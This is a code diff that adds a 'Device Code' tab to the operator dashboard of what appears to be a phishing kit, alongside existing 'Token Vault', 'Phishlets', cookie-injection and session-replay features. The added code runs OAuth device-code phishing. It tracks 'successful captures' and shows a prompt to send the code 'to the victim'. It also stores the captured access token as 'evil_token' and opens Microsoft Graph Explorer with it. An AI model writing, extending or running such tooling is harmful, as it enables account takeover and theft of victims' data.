@@ -227,6 +227,7 @@
             display: flex;
             gap: 12px;
             align-items: center;
+            flex-wrap: wrap;
         }
 
         .btn {
@@ -700,6 +701,7 @@
         <div class="header-actions">
             <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
             <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
+            <button class="btn" onclick="window.open('/device','_blank')" style="border-color: rgba(255,215,0,0.3); color: #ffd700;">📱 Device Code</button>
         </div>
     </header>
 
@@ -746,6 +748,7 @@
         <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
         <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
         <div class="tab" data-tab="phishlets" onclick="switchTab('phishlets')">🎭 Phishlets</div>
+        <div class="tab" data-tab="device" onclick="switchTab('device')" style="border-color: rgba(255,215,0,0.2); color: #ffd700;">📱 Device Code</div>
     </div>
 
     <!-- ==================== TAB: Dashboard ==================== -->
@@ -870,6 +873,55 @@
             </table>
         </div>
     </div>
+
+    <!-- ==================== TAB: Device Code ==================== -->
+    <div id="tab-device" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="startDeviceFlow()">🚀 Start New Flow</button>
+            <button class="btn" onclick="refreshDeviceHistory()">🔄 Refresh</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="deviceStats">📊 0 flows · 0 approved</span>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card glass">
+                <label>Active Flows</label>
+                <div class="value" id="activeFlows">0</div>
+                <div class="sub">Waiting for approval</div>
+            </div>
+            <div class="stat-card glass">
+                <label>Approved</label>
+                <div class="value" id="approvedFlows">0</div>
+                <div class="sub">Successful captures</div>
+            </div>
+            <div class="stat-card glass">
+                <label>Expired</label>
+                <div class="value" id="expiredFlows">0</div>
+                <div class="sub">Codes expired</div>
+            </div>
+        </div>
+
+        <!-- Table -->
+        <div class="table-wrap glass" style="padding: 8px;">
+            <table>
+                <thead><tr><th>Code</th><th>Status</th><th>Created</th><th>Approved</th><th>Token Type</th><th>Actions</th></tr></thead>
+                <tbody id="deviceHistoryTable">
+                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows yet. Click "Start New Flow" to begin.</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Manual Code Generator -->
+        <div class="glass" style="padding: 16px; margin-top: 16px;">
+            <h4 style="color: rgba(255,255,255,0.5); font-weight: 400; margin-bottom: 8px;">🔧 Manual Code Generator</h4>
+            <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
+                <input type="text" id="manualCode" placeholder="Enter custom code (e.g., ABC123)" style="flex:1; min-width:200px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1); border-radius:40px; padding:8px 18px; color:#e0e8f0; outline:none;">
+                <button class="btn btn-warning" onclick="generateManualCode()">🔑 Generate</button>
+                <button class="btn" onclick="copyCode()">📋 Copy</button>
+            </div>
+            <div id="manualCodeResult" style="margin-top:8px; font-size:14px; color:rgba(255,255,255,0.4);"></div>
+        </div>
+    </div>
 </div>
 
 <!-- Modal -->
@@ -896,6 +948,8 @@
     const maxReconnectAttempts = 20;
     let ws;
     let vaultTokens = [];
+    let deviceHistory = [];
+    let deviceInterval;
 
     // =============================================
     // THEME
@@ -924,6 +978,13 @@
         if (tabId === 'vault') loadVault();
         if (tabId === 'analytics') loadAnalytics();
         if (tabId === 'phishlets') loadPhishlets();
+        if (tabId === 'device') {
+            refreshDeviceHistory();
+            if (deviceInterval) clearInterval(deviceInterval);
+            deviceInterval = setInterval(refreshDeviceHistory, 10000);
+        } else {
+            if (deviceInterval) clearInterval(deviceInterval);
+        }
     }
 
     // =============================================
@@ -1202,7 +1263,7 @@
     }
 
     // =============================================
-    // VIEW LOG - FIXED
+    // VIEW LOG
     // =============================================
     async function viewLog(filename) {
         const modal = document.getElementById('modal');
@@ -1253,7 +1314,7 @@
     }
 
     // =============================================
-    // INJECT COOKIES - FIXED
+    // INJECT COOKIES
     // =============================================
     async function injectCookies(filename) {
         try {
@@ -1293,7 +1354,7 @@
     }
 
     // =============================================
-    // REPLAY SESSION - FIXED
+    // REPLAY SESSION
     // =============================================
     async function replaySession(filename) {
         try {
@@ -1682,6 +1743,147 @@
             }
         } catch (e) {
             showToast('❌ Failed to toggle phishlet: ' + e.message, true);
+        }
+    }
+
+    // =============================================
+    // DEVICE CODE TAB
+    // =============================================
+    function startDeviceFlow() {
+        showToast('🚀 Starting new device flow...');
+        window.open('/device', '_blank');
+        setTimeout(refreshDeviceHistory, 3000);
+    }
+
+    async function refreshDeviceHistory() {
+        try {
+            const res = await fetch('/dash/api/device/history');
+            const data = await res.json();
+            if (!data.success) return;
+            deviceHistory = data.flows || [];
+            renderDeviceTable();
+            updateDeviceStats();
+        } catch (e) {
+            console.error('Failed to fetch device history:', e);
+        }
+    }
+
+    function renderDeviceTable() {
+        const tbody = document.getElementById('deviceHistoryTable');
+        if (deviceHistory.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows yet. Click "Start New Flow" to begin.</td></tr>`;
+            return;
+        }
+        tbody.innerHTML = '';
+        deviceHistory.slice(0, 50).forEach(flow => {
+            const row = document.createElement('tr');
+            const statusColors = {
+                'pending': 'badge-warning',
+                'approved': 'badge-success',
+                'expired': 'badge-danger'
+            };
+            const statusLabels = {
+                'pending': '⏳ Pending',
+                'approved': '✅ Approved',
+                'expired': '❌ Expired'
+            };
+            const statusClass = statusColors[flow.status] || 'badge';
+            const statusLabel = statusLabels[flow.status] || flow.status;
+            const created = new Date(flow.created).toLocaleString();
+            const approved = flow.approved ? new Date(flow.approved).toLocaleString() : '—';
+            row.innerHTML = `
+                <td><span style="font-family:monospace; font-weight:600; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">${flow.user_code}</span></td>
+                <td><span class="badge ${statusClass}">${statusLabel}</span></td>
+                <td style="font-size:12px; color:rgba(255,255,255,0.4);">${created}</td>
+                <td style="font-size:12px; color:rgba(255,255,255,0.4);">${approved}</td>
+                <td><span class="badge badge-info">${flow.token_type || 'N/A'}</span></td>
+                <td>
+                    ${flow.status === 'pending' ? `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>` : ''}
+                    ${flow.access_token ? `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>` : ''}
+                    <button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>
+                </td>
+            `;
+            tbody.appendChild(row);
+        });
+    }
+
+    function updateDeviceStats() {
+        const total = deviceHistory.length;
+        const pending = deviceHistory.filter(f => f.status === 'pending').length;
+        const approved = deviceHistory.filter(f => f.status === 'approved').length;
+        const expired = deviceHistory.filter(f => f.status === 'expired').length;
+        document.getElementById('activeFlows').textContent = pending;
+        document.getElementById('approvedFlows').textContent = approved;
+        document.getElementById('expiredFlows').textContent = expired;
+        document.getElementById('deviceStats').textContent = `📊 ${total} flows · ${approved} approved`;
+    }
+
+    function showDeviceCode(code) {
+        alert(`📱 Device Code: ${code}\n\nSend this to the victim to enter on their device.`);
+    }
+
+    function copyDeviceCode(code) {
+        navigator.clipboard.writeText(code);
+        showToast(`📋 Code "${code}" copied!`);
+    }
+
+    function generateManualCode() {
+        const input = document.getElementById('manualCode');
+        let code = input.value.trim().toUpperCase();
+        if (!code) {
+            code = Math.random().toString(36).substring(2, 8).toUpperCase();
+        }
+        fetch('/dash/api/device/manual', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user_code: code })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById('manualCodeResult').innerHTML = `
+                    ✅ Code <strong style="font-family:monospace;background:rgba(255,215,0,0.1);padding:2px 8px;border-radius:4px;">${code}</strong> generated!
+                    <span style="color:rgba(255,255,255,0.3);margin-left:8px;">Waiting for device approval...</span>
+                `;
+                showToast(`✅ Code "${code}" generated!`);
+                refreshDeviceHistory();
+            } else {
+                document.getElementById('manualCodeResult').innerHTML = `❌ ${data.error || 'Generation failed'}`;
+            }
+        })
+        .catch(e => {
+            document.getElementById('manualCodeResult').innerHTML = `❌ Error: ${e.message}`;
+        });
+    }
+
+    function copyCode() {
+        const result = document.getElementById('manualCodeResult').innerHTML;
+        const match = result.match(/<strong[^>]*>([A-Z0-9]+)<\/strong>/);
+        if (match) {
+            navigator.clipboard.writeText(match[1]);
+            showToast(`📋 Code "${match[1]}" copied!`);
+        } else {
+            showToast('⚠️ Generate a code first!', true);
+        }
+    }
+
+    async function useDeviceToken(sessionId) {
+        try {
+            const res = await fetch('/dash/api/device/use', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ session_id: sessionId })
+            });
+            const data = await res.json();
+            if (data.success && data.access_token) {
+                showToast(`✅ Token obtained! Opening Graph Explorer...`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+            } else {
+                showToast('❌ Failed to use token: ' + (data.error || 'Unknown'), true);
+            }
+        } catch (e) {
+            showToast('❌ Error: ' + e.message, true);
         }
     }
 
